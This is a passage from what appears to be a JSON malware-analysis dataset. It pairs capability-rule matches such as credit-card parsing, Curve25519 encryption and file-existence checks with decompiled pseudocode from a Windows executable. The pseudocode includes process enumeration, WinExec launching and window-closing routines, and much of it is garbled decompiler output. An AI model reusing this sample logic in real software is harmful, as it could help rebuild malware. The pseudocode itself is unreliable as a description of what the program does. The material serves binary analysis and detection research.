(bVar9) {\n                uVar2 = in(uVar18);\n                *puVar8 = uVar2;\n                if (!uVar3 && !uVar10) {\n                    *unaff_ESI = *unaff_ESI + (iVar17 >> 0x18) + uVar3;\n                    goto code_r0x00401bbd;\n                }\n                uVar16 = 0x56;\n                uVar15 = CONCAT44(uVar7, 0x4c68046a);\n                goto code_r0x00401b57;\n            }\n        }\n        uVar19 = 4;\n        uVar20 = 0;\n        arg_10h_01 = 0x40734c;\n        uVar16 = 8;\ncode_r0x00401b59:\n        pcVar6 = uVar7 + 8;\n        *pcVar6 = *pcVar6 + cVar11;\n        bVar9 = *pcVar6 < '\\0';\n        uVar5 = 0x401b66;\n        uVar15 = fcn.00402570(0x423610, uVar16, arg_10h_01, CONCAT22(uVar20, uVar19));\n        iVar17 = uVar15 >> 0x20;\n        if ((bVar9) || (!bVar9)) {\n            uVar5 = 0xc;\n            arg_10h = 0x407350;\n            arg_ch = 8;\n        }\n        else if (uVar15 < 0xaf97f396) {\n            pcVar6 = iVar17 + 8;\n            *pcVar6 = *pcVar6 + extraout_CH_03;\n            goto code_r0x00401bbd;\n        }\n        pcVar23 = iVar17 + 8;\n        *pcVar23 = *pcVar23 + extraout_CH_03;\n        fcn.00402570(0x423610, arg_ch, arg_10h, uVar5);\n        pcVar23 = 0x4;\n        arg_10h_02 = 0x40735c;\n        uVar21 = 8;\n        uVar22 = 0;\n    }\n    else {\n        uVar16 = uVar16 & 0xffff | uVar7 << 0x10;\n        if (!bVar14) goto code_r0x00401aec;\n        puVar8 = unaff_EDI + bVar12 * -2 + 1;\n        uVar10 = in(uVar15 >> 0x20);\n        *unaff_EDI = uVar10;\n        cVar11 = extraout_CH_01;\n        if (uVar3 || bVar9) {\n            iVar17 = 0x56;\n            unaff_EDI = puVar8;\n            if (uVar3) goto code_r0x00401af2;\n            *0x3c680b6a = *0x3c680b6a + 'j';\n            puVar1 = unaff_ESI + 0x52;\n            uVar3 = 0xf4 < *puVar1;\n            bVar9 = SCARRY1(*puVar1, '\\v');\n            *puVar1 = *puVar1 + 0xb;\n            uVar10 = *puVar1 == 0;\n            goto code_r0x00401b37;\n        }\ncode_r0x00401b57:\n        uVar7 = uVar15 >> 0x20;\n        if (uVar3) goto code_r0x00401b59;\n        if (!uVar3) {\n            uVar4 = uVar15 + cVar11;\n            pcVar6 = uVar15 & 0xffffff00 | uVar4;\n            *pcVar6 = *pcVar6 + uVar4;\n            goto code_r0x00401bbd;\n        }\n        *(uVar7 + 8) = *(uVar7 + 8) + cVar11;\n    }\n    fcn.00402570(0x423610, CONCAT22(uVar22, uVar21), arg_10h_02, pcVar23);\n    pcVar23 = 0x9;\n    arg_10h_02 = 0x407360;\n    uVar21 = 8;\n    uVar22 = 0;\ncode_r0x00401bbd:\n    fcn.00402570(0x423610, CONCAT22(uVar22, uVar21), arg_10h_02, pcVar23);\n    fcn.00402570(0x423610, 8, 0x40736c, 0x16);\n    fcn.00402570(0x423610, 8, 0x407384, 7);\n    return;\n}\n",
        "token_count": 2559
    },
    "00404c90": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404f35) overlaps instruction at (ram,0x00404f33)\n// \n// WARNING: Removing unreachable block (ram,0x00404cd7)\n// WARNING: Removing unreachable block (ram,0x00404cde)\n// WARNING: Removing unreachable block (ram,0x00404dcb)\n\nint32_t __cdecl fcn.00404c90(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uint uVar7;\n    char cVar10;\n    int32_t iVar8;\n    uint32_t extraout_ECX;\n    char *pcVar9;\n    char extraout_DL;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    bool bVar11;\n    bool bVar12;\n    ulong uVar13;\n    uint32_t uStack680;\n    int32_t iStack676;\n    char *pcStack672;\n    uint uStack584;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uint uStack124;\n    uint8_t *puStack120;\n    uchar auStack116 [4];\n    uint uStack112;\n    uint uStack108;\n    uchar auStack104 [4];\n    uchar auStack100 [4];\n    uchar auStack96 [44];\n    uint32_t uStack52;\n    ushort uStack48;\n    uchar *puStack28;\n    uint *puStack24;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = &fcn.00404c90::var_213h;\n    for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    s = 0;\n    puVar6 = &fcn.00404c90::var_10fh;\n    for (iVar8 = 0x40; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    var_ch = 1;\n    *(puVar6 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    fcn.00403790(&fcn.00404c90::var_4h, &fcn.00404c90::var_8h);\n    uStack584 = 0x404d5f;\n    iVar8 = fcn.00401000(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar8 == 0) {\n        return 0;\n    }\n    iVar8 = fcn.004048b0(&stack0xfffffeec, var_4h, var_8h);\n    if (iVar8 == 0) {\n        return 0;\n    }\n    bVar11 = false;\n    pcStack672 = (arg_8h >> 8 & 0xffff00) << 8 | arg_8h & 0xffff;\n    fcn.00402830();\n    if ((!bVar11) && (bVar11)) {\n        pcStack672 = pcStack672 + bVar11 + *(pcStack672 + extraout_EDX * 4 + 0x69);\n    }\n    iVar8 = fcn.00402120(0x407068);\n    if (iVar8 == -1) {\n        iVar8 = fcn.00402120(0x40705c);\n        if (iVar8 == -1) goto code_r0x00404e5b;\n        pcStack672 = 0xf;\n    }\n    else {\n        pcStack672 = 0xe;\n    }\n    iVar8 = fcn.00402040(arg_8h);\n    if (iVar8 != 0) {\n        fcn.004032b0();\n        fcn.00402da0();\n        return 1;\n    }\n    if (*0x423634 == 0) {\n        return 0;\n    }\ncode_r0x00404e5b:\n    uVar13 = fcn.004046f0(arg_8h, &stack0xfffffeec);\n    uVar7 = uVar13 >> 0x20;\n    iVar8 = var_ch;\n    if (uVar13 == 0) {\n        iVar8 = 0;\n    }\n    if (iVar8 != 0) {\n        uVar13 = fcn.00402660(arg_8h);\n        uVar7 = uVar13 >> 0x20;\n        iVar4 = uVar13;\n        if (iVar4 == 0) {\n            iVar8 = iVar4;\n            var_ch = iVar4;\n        }\n    }\n    uVar13 = CONCAT44(uVar7, iVar8);\n    if (iVar8 == 0) {\n        uVar13 = fcn.00402e80(arg_8h, 0);\n        var_ch = uVar13;\n    }\n    iVar8 = uVar13 >> 0x20;\n    iStack676 = uVar13;\n    bVar11 = false;\n    if (iStack676 != 0) {\n        fcn.00402da0();\n        bVar11 = 0xfffffffb < &stack0xfffffdd0;\n        iVar8 = extraout_EDX_00;\n    }\n    bVar12 = iStack676 == 0 || *0x10 == 0x22c;\n    if ((!bVar11) && (bVar11)) {\n        uVar2 = bVar11;\n        bVar11 = CARRY4(pcStack672, *(pcStack672 + iVar8 * 4 + 0x69)) ||\n                 CARRY4(pcStack672 + *(pcStack672 + iVar8 * 4 + 0x69), uVar2);\n        pcStack672 = pcStack672 + *(pcStack672 + iVar8 * 4 + 0x69) + uVar2;\n        bVar12 = pcStack672 == NULL;\n    }\n    iVar8 = (*_sym.imp.KERNEL32.dll_Sleep)();\n    if ((bVar11 || bVar12) || (!bVar11 && !bVar12)) {\n        (*_sym.imp.KERNEL32.dll_WinExec)();\n    }\n    else {\n        uVar2 = CONCAT11((extraout_ECX >> 8) - *pcStack672, extraout_ECX);\n        pcVar9 = extraout_ECX & 0xffff0000 | uVar2;\n        *(arg_8h + 0x6a) = *(arg_8h + 0x6a) - &stack0xfffffdd0;\n        pcVar5 = iVar8 + 0x7c;\n        cVar1 = *pcVar5;\n        cVar10 = uVar2 >> 8;\n        *pcVar5 = *pcVar5 + cVar10;\n        if (SCARRY1(cVar1, cVar10)) {\n            LOCK();\n            _pe_dos_header = &stack0xfffffdcc;\n            pcVar5 = iVar8 + 1;\n            *pcVar9 = *pcVar9 + (pcVar5 >> 8);\n            *pcVar5 = *pcVar5 + pcVar5;\n            *(iVar8 + 0x65) = *(iVar8 + 0x65) + extraout_DL;\n            puStack28 = &stack0xfffffd58;\n            uStack680 = arg_8h;\n            var_4h = 0;\n            (*_sym.imp.MSVCRT.dll___set_app_type)(2);\n            *0x423670 = 0xffffffff;\n            *0x423674 = 0xffffffff;\n            puVar6 = (*_sym.imp.MSVCRT.dll___p__fmode)();\n            *puVar6 = *0x42366c;\n            puVar6 = (*_sym.imp.MSVCRT.dll___p__commode)();\n            *puVar6 = *0x423668;\n            *0x423678 = *_sym.imp.MSVCRT.dll__adjust_fdiv;\n            fcn.004050ef();\n            if (*0x423620 == 0) {\n                (*_sym.imp.MSVCRT.dll___setusermatherr)(0x4050ec);\n            }\n            fcn.004050da();\n            sub.MSVCRT.dll__initterm(0x407008, 0x40700c);\n            uStack112 = *0x423664;\n            (*_sym.imp.MSVCRT.dll___getmainargs)\n                      (&stack0xffffff9c, &stack0xffffff8c, &stack0xffffff98, *0x423660, &stack0xffffff90);\n            sub.MSVCRT.dll__initterm(0x407000, 0x407004);\n            puStack120 = *_sym.imp.MSVCRT.dll__acmdln;\n            if (*puStack120 != 0x22) {\n                do {\n                    if (*puStack120 < 0x21) goto code_r0x00405063;\n                    puStack120 = puStack120 + 1;\n                } while( true );\n            }\n            do {\n                puStack120 = puStack120 + 1;\n                if (*puStack120 == 0) break;\n            } while (*puStack120 != 0x22);\n            if (*puStack120 != 0x22) goto code_r0x00405063;\n            do {\n                puStack120 = puStack120 + 1;\ncode_r0x00405063:\n                puVar3 = puStack120;\n            } while ((*puStack120 != 0) && (*puStack120 < 0x21));\n            uStack52 = 0;\n            (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(&stack0xffffffa0);\n            if ((uStack52 & 1) == 0) {\n                uStack48 = 10;\n            }\n            uVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0, 0, puVar3, uStack48);\n            uStack108 = main(uVar7);\n            (*_sym.imp.MSVCRT.dll_exit)(uStack108);\n            uStack124 = **puStack24;\n            iVar8 = sub.MSVCRT.dll__XcptFilter(uStack124, puStack24);\n            return iVar8;\n        }\n    }\n    return iStack676;\n}\n",
        "token_count": 2394
    },
    "00401c10": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401db2) overlaps instruction at (ram,0x00401db1)\n// \n// WARNING: Removing unreachable block (ram,0x00401cb0)\n\nuint * fcn.00401c10(void)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    bool bVar3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint *puVar7;\n    ushort extraout_CX;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    char extraout_DL;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint16_t *unaff_EBX;\n    uint32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar10;\n    uint *puVar11;\n    uint16_t *puVar12;\n    uint unaff_EDI;\n    uint *puVar13;\n    uint *puVar14;\n    ushort in_ES;\n    ushort in_SS;\n    uchar uVar15;\n    uchar uVar16;\n    uint8_t in_AF;\n    bool bVar17;\n    uchar uVar18;\n    char cVar19;\n    char cVar20;\n    ulong uVar21;\n    uint *unaff_retaddr;\n    uint arg_ch;\n    uint arg_10h;\n    ushort uVar22;\n    ushort uVar23;\n    ushort uVar24;\n    ushort uVar25;\n    ushort uVar26;\n    ushort uVar27;\n    \n    puVar7 = unaff_ESI;\n    puVar12 = unaff_EBX;\n    iVar5 = fcn.00402570(0x423610, 8, 0x40738c, 0x20);\n    cVar20 = SCARRY4(iVar5, 1);\n    cVar19 = iVar5 + 1 < 0;\n    bVar17 = iVar5 == -1;\n    uVar26 = 0x26;\n    uVar27 = 0;\n    uVar24 = 0x73ac;\n    uVar25 = 0x40;\n    uVar22 = 8;\n    uVar23 = 0;\n    uVar21 = fcn.00402570(0x423610, 8, 0x4073ac, 0x26);\n    pcVar6 = uVar21;\n    uVar4 = extraout_CX >> 8;\n    if ((bVar17 || cVar20 != cVar19) || (!bVar17 && cVar20 == cVar19)) {\n        pcVar6 = (uVar21 >> 0x20) + 8;\n        *pcVar6 = *pcVar6 + uVar4;\n        fcn.00402570(0x423610, 8, 0x4073d4, 8);\n        fcn.00402570(0x423610, 8, 0x4073dc, 0x19);\n        uVar26 = 0xb;\n        uVar27 = 0;\n        uVar24 = 0x73f8;\n        uVar25 = 0x40;\n        uVar22 = 8;\n        uVar23 = 0;\n    }\n    else {\n        pcVar6[0x6a39da56] = pcVar6[0x6a39da56] ^ extraout_CX;\n        pcVar6[-0x2c] = pcVar6[-0x2c] | uVar4;\n        unaff_EBX = unaff_EBX + *(unaff_EBX + 0x6b) + 1;\n        if ((unaff_EBP | *(pcVar6 + -8)) < 0) goto code_r0x00401cfa;\n        *pcVar6 = *pcVar6 + uVar21;\n    }\n    fcn.00402570(0x423610, CONCAT22(uVar23, uVar22), CONCAT22(uVar25, uVar24), CONCAT22(uVar27, uVar26));\n    fcn.00402570(0x423610, 8, 0x407404, 0x12);\n    uVar26 = unaff_EDI;\n    uVar27 = unaff_EDI >> 0x10;\ncode_r0x00401cfa:\n    fcn.00402570(0x423610, 8, 0x407418, 0x12);\n    bVar17 = extraout_DL == 'Q';\n    fcn.00402570(0x423610, 8, 0x40742c, 2);\n    puVar10 = unaff_ESI;\n    if ((!bVar17) && (bVar17)) {\n        puVar10 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    fcn.00402570(0x423610, 8, 0x407430, 8);\n    bVar17 = (POPCOUNT(extraout_CH | 0x47) & 1U) == 0;\n    puVar13 = CONCAT22(uVar27, uVar26);\n    fcn.00402570(0x423610, 8, 0x407438, 8);\n    if ((bVar17) || (!bVar17)) {\n        iVar5 = 6;\n    }\n    else {\n        puVar10 = 0x34a96cf4;\n        iVar5 = CONCAT22(uVar27, in_ES);\n    }\n    arg_10h = 0x407440;\n    arg_ch = 8;\ncode_r0x00401db8:\n    fcn.00402570(0x423610, arg_ch, arg_10h, iVar5);\n    fcn.00402570(0x423610, 8, 0x407448, 7);\n    uVar4 = extraout_DX_00 >> 8;\n    cVar19 = CARRY1(extraout_DX_00, uVar4);\n    bVar17 = SCARRY1(extraout_DX_00, uVar4);\n    uVar26 = 7;\n    uVar27 = 0;\n    uVar24 = 0x7450;\n    uVar25 = 0x40;\n    uVar22 = 8;\n    uVar23 = 0;\n    do {\n        uVar21 = fcn.00402570(0x423610, CONCAT22(uVar23, uVar22), CONCAT22(uVar25, uVar24), CONCAT22(uVar27, uVar26));\n        iVar8 = uVar21 >> 0x20;\n        uVar4 = extraout_ECX >> 8;\n        if ((bVar17) || (!bVar17)) {\n            iVar5 = 6;\n            arg_10h = 0x407458;\n        }\n        else {\n            puVar14 = puVar13 + 1;\n            puVar11 = puVar10 + 1;\n            *puVar13 = *puVar10;\n            iVar8 = 0x5868066a;\n            puVar10 = puVar11;\n            puVar13 = puVar14;\n            iVar5 = extraout_ECX;\n            if (uVar21 == -1) {\n                uVar4 = pe_dos_header + cVar19;\n                puVar1 = uVar4;\n                uVar15 = CARRY1(*puVar1, uVar4);\n                *puVar1 = *puVar1 + uVar4;\n                uVar18 = *puVar1 == 0;\n                uVar16 = (POPCOUNT(*puVar1) & 1U) == 0;\n                iVar8 = extraout_ECX;\n                goto code_r0x00401e5b;\n            }\n        }\n        puVar1 = iVar8 + 8;\n        uVar15 = CARRY1(*puVar1, uVar4);\n        cVar20 = SCARRY1(*puVar1, uVar4);\n        *puVar1 = *puVar1 + uVar4;\n        cVar19 = *puVar1 < '\\0';\n        uVar18 = *puVar1 == 0;\n        uVar16 = (POPCOUNT(*puVar1) & 1U) == 0;\n        arg_ch = 0x423610;\n        uVar21 = fcn.00402570(0x423610, 0x423610, arg_10h, iVar5);\n        iVar9 = uVar21 >> 0x20;\n        puVar11 = puVar10;\n        puVar14 = puVar13;\n        if ((uVar18 || cVar20 != cVar19) || (!uVar18 && cVar20 == cVar19)) {\n            do {\n                uVar26 = 0x25;\n                uVar27 = 0;\n                uVar24 = 0x7460;\n                uVar25 = 0x40;\n                uVar22 = 8;\n                uVar23 = 0;\n                fcn.00402570(0x423610, 8, 0x407460, 0x25);\n                if ((uVar16) || (iVar8 = extraout_ECX_01,  !uVar16)) {\ncode_r0x00401e6d:\n                    puVar7 = fcn.00402570(0x423610, 8, 0x407488, 8);\n                    return puVar7;\n                }\ncode_r0x00401e5b:\n                segment(in_SS, *0x10 + -0x1c);\n                iVar9 = -0x4843615b;\n                if (uVar15) {\n                    bVar17 = false;\n                    puVar10 = unaff_retaddr;\n                    do {\n                        bVar3 = unaff_retaddr == NULL;\n                        if (bVar3) {\n                            return (puVar7 >> 0x10) + puVar7;\n                        }\n                        if ((!bVar3) && (bVar3)) {\n                            unaff_EBX = unaff_EBX + 1;\n                            if (bVar17 || unaff_EBX == NULL) {\n                                return puVar10;\n                            }\n                            in_AF = 9 < (puVar10 & 0xf) | in_AF;\n                            piVar2 = (puVar10 & 0xffff0000 |\n                                     CONCAT11((puVar10 >> 8) + in_AF, puVar10 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n                            *piVar2 = *piVar2 - unaff_EBX;\n                            puVar12 = puVar12 + 1;\n                        }\n                        puVar7 = puVar7 + *puVar12;\n                        puVar10 = puVar7 >> 0x10;\n                        if (puVar7 >> 0x10 != 0) {\n                            puVar10 = puVar10 + (puVar7 & 0xffff);\n                            puVar7 = puVar10;\n                        }\n                        bVar17 = 0xfffffffd < puVar12;\n                        puVar12 = puVar12 + 1;\n                        unaff_retaddr = unaff_retaddr + -1;\n                    } while( true );\n                }\n                if (!uVar16) goto code_r0x00401e6d;\n                puVar10 = puVar11;\n                puVar13 = puVar14;\n            } while (uVar18);\n        }\n        else {\n            in_AF = 9 < (uVar21 & 0xf) | in_AF;\n            if (extraout_ECX_00 != 0) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            iVar8 = extraout_ECX_00;\n            if ((uVar21 & 0xffff0000 | CONCAT11((uVar21 >> 8) + in_AF, uVar21 + in_AF * '\\x06') & 0xff0f) != 0xffffffff)\n            break;\n        }\n        puVar1 = iVar9 + 8;\n        uVar4 = iVar8 >> 8;\n        cVar19 = CARRY1(*puVar1, uVar4);\n        bVar17 = SCARRY1(*puVar1, uVar4);\n        *puVar1 = *puVar1 + uVar4;\n    } while( true );\n    *(iVar9 + 8) = *(iVar9 + 8);\n    goto code_r0x00401db8;\n}\n",
        "token_count": 2779
    },
    "00402570": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004025bf) overlaps instruction at (ram,0x004025be)\n// \n\nvoid __cdecl fcn.00402570(uint arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    bool bVar7;\n    uint auStack24 [2];\n    \n    puVar5 = &stack0xfffffffc;\n    puVar6 = NULL;\n    if (0 < arg_14h) {\n        do {\n            iVar1 = puVar5[2];\n            bVar7 = SBORROW1(puVar6 % puVar5[3] + '\\x15', iVar1 >> 8);\n            if ((bVar7) || (!bVar7)) {\n                uVar3 = puVar5[5];\n                *(puVar6 + arg_10h) = uVar3 ^ *(puVar6 + arg_10h) ^ *(puVar6 % puVar5[3] + iVar1);\n            }\n            else {\n                *arg_10h = *puVar6;\n                puVar4 = auStack24 + 1;\n                cVar2 = '\\a';\n                do {\n                    puVar5 = puVar5 + -1;\n                    puVar4 = puVar4 + -1;\n                    *puVar4 = *puVar5;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n                uVar3 = iVar1 + 1U | 0x3e;\n                puVar5 = auStack24 + 1;\n                puVar6 = puVar6 + 1;\n                arg_10h = arg_10h + 1;\n            }\n            puVar6 = puVar6 + 1;\n        } while (puVar6 < uVar3);\n    }\n    return;\n}\n",
        "token_count": 447
    },
    "004041f0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004041f0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073d4);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x404170, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 376
    },
    "00401e90": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401e90(uint32_t arg_8h, uint16_t *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t unaff_EBX;\n    bool bVar3;\n    uint8_t in_AF;\n    bool bVar4;\n    \n    bVar3 = false;\n    bVar4 = arg_10h == 0;\n    uVar2 = arg_10h;\n    do {\n        if (bVar4) {\n            return (arg_8h >> 0x10) + arg_8h;\n        }\n        if ((!bVar4) && (bVar4)) {\n            unaff_EBX = unaff_EBX + 1;\n            if (bVar3 || unaff_EBX == 0) {\n                return uVar2;\n            }\n            in_AF = 9 < (uVar2 & 0xf) | in_AF;\n            piVar1 = (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - unaff_EBX;\n            arg_ch = arg_ch + 1;\n        }\n        arg_8h = arg_8h + *arg_ch;\n        uVar2 = arg_8h >> 0x10;\n        if (arg_8h >> 0x10 != 0) {\n            uVar2 = uVar2 + (arg_8h & 0xffff);\n            arg_8h = uVar2;\n        }\n        bVar3 = 0xfffffffd < arg_ch;\n        arg_ch = arg_ch + 1;\n        arg_10h = arg_10h - 1;\n        bVar4 = arg_10h == 0;\n    } while( true );\n}\n",
        "token_count": 435
    },
    "00403000": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004030be) overlaps instruction at (ram,0x004030bd)\n// \n\nvoid fcn.00403000(uint *param_1, int32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    ushort extraout_CX;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *unaff_EDI;\n    ushort in_SS;\n    bool bVar9;\n    uint *puVar10;\n    \n    uVar4 = fcn.00401e90(0, param_1, param_2 + 1U >> 1);\n    if ((*0x10 == 0x18) || (*0x10 != 0x18)) {\n        puVar10 = param_1;\n        pcVar5 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(param_1);\n    }\n    else {\n        unaff_EDI = CONCAT22(extraout_CX, in_SS);\n        puVar10 = 0x47;\n        pcVar5 = sym.imp.dbghelp.dll_ImageNtHeader + (uVar4 & 0xffff);\n    }\n    iVar2 = *(pcVar5 + 0x58);\n    uVar8 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar3 = *(uVar8 + 8);\n    uVar4 = *(uVar8 - 4);\n    bVar9 = SBORROW2(iVar3, uVar4);\n    if (iVar3 < uVar4) {\n        if (!bVar9) {\n            if (bVar9) {\n                *unaff_EDI = *param_1;\n                *(iVar3 + 1) = *(iVar3 + 1) + 1;\n                *(iVar3 + -0x76) = *(iVar3 + -0x76) + iVar2;\n                puVar1 = iVar2 + 0x22;\n                *puVar1 = *puVar1 | 0x2b;\n                func_0xf6622e43(puVar10);\n                return;\n            }\n        }\n        uVar6 = (iVar3 - uVar4 & 0xffff) - 1;\n        *(uVar8 + 8) = uVar6;\n    }\n    else {\n        uVar6 = iVar3 - (uVar4 & 0xffff);\n    }\n    uVar7 = uVar4 >> 0x10;\n    bVar9 = uVar6 < uVar4 >> 0x10;\n    if (bVar9) {\n        uVar4 = (uVar6 - uVar7 & 0xffff) - 1;\n        *(uVar8 + 8) = uVar4;\n    }\n    else {\n        uVar4 = uVar6 - uVar7;\n    }\n    if (((bVar9 || uVar7 <= uVar6) && uVar4 != 0) && (!bVar9 && uVar7 > uVar6 || uVar4 == 0)) {\n        uVar4 = uVar4 & 0xe2f4cc58;\n    }\n    **(uVar8 + 0x14) = uVar4 + *(uVar8 + 0xc);\n    **(uVar8 + 0x10) = *(*(uVar8 - 8) + 0x58);\n    return;\n}\n",
        "token_count": 782
    },
    "00402120": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040217d) overlaps instruction at (ram,0x0040217a)\n// \n// WARNING: Removing unreachable block (ram,0x004021da)\n// WARNING: Removing unreachable block (ram,0x00402171)\n\nuint __cdecl fcn.00402120(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    iVar1 = (**0x423628)(2, 0);\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_12ch = 0x128;\n    puVar3 = &var_128h;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar2 = (**0x42362c)(iVar1, &var_12ch);\n    do {\n        if (iVar2 == 0) {\ncode_r0x004021e7:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_4h;\n        }\n        iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, arg_8h);\n        if (iVar2 == 0) {\n            var_4h = var_124h;\n            goto code_r0x004021e7;\n        }\n        iVar2 = (**0x423630)(iVar1, &var_12ch);\n    } while( true );\n}\n",
        "token_count": 427
    },
    "004025e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.004025e0(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00402db0(0x80000002, 0x4072f0, 0x407330, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 152
    },
    "00402760": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402760(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404610(0x407010);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 73
    },
    "004028e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
